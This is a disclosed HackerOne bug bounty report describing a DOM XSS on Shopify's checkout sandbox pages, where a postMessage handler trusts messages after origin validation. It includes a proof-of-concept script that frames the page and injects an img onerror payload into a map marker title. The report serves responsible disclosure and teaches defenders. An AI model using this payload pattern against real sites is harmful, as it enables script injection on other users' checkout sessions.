# H1514 DOM XSS on checkout.shopify.com via postMessage handler on /:id/sandbox/google_maps

## Report Details
- **Report ID**: 423218
- **URL**: https://hackerone.com/reports/423218
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-10-13T05:28:07.606Z
- **Disclosed**: 2019-11-04T02:16:08.726Z

## Reporter
- **Username**: bored-engineer
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
# Description:
The `/:id/sandbox/google_maps` and `/:id/sandbox/google_autocomplete` routes on `checkout.shopify.com` are used to render the Google Map on the "Order Status" page as well as the address prediction on checkout pages. The page performs origin validation on incoming postMessages making sure the origin matches the shop associated with `:id` but then trusts all communication after that validation. A malicious shop can render a Google Map (on checkout.shopify.com) with arbitrary HTML injected as a label which executes on checkout.shopify.com

# Technical Details:
Create a shop, capture it's ID (`4736483384` in this case). Then add the following script to the shop template:
```js
var frame = document.createElement("iframe");
frame.src = "https://checkout.shopify.com/4736483384/sandbox/google_maps";
frame.onload = function() {
  frame.contentWindow.postMessage("shopify_google_api:" + JSON.stringify({
    action: "createMapAndMarkers", 
    body: [{
      title: "<img src=xx: onerror=alert(document.domain)>"
    }]
  }), "*");
}
document.body.appendChild(frame);
```

# Steps To Reproduce:
Open [bored-engineering-whitehat-2.myshopify.com/#pwn](https://bored-engineering-whitehat-2.myshopify.com/#pwn), wait for the popup.

## Impact

XSS on checkout.shopify.com which hosts maps and other information for order statuses and cart checkouts.

## Attachments
No attachments
